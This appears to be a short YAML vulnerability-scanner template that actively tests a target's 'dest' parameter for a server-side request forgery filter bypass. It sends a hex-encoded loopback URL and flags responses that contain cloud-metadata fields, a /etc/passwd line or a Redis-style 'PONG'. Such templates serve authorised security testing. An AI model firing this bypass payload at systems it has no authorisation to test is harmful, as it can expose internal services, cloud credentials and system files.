id: ssrf2-047
name: 'SSRF2 bypass via dest'
severity: high
type: active
tags:
  - ssrf
  - oob
  - cloud
  - bypass
description: 'SSRF filter bypass via dest'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      dest:
        - 'http://0x7f.0.0.1/'
    matchers:
      - type: word
        part: body
        words:
          - 'ami-id'
          - 'instance-id'
          - 'metadata'
          - 'root:x:0:0'
          - 'PONG'
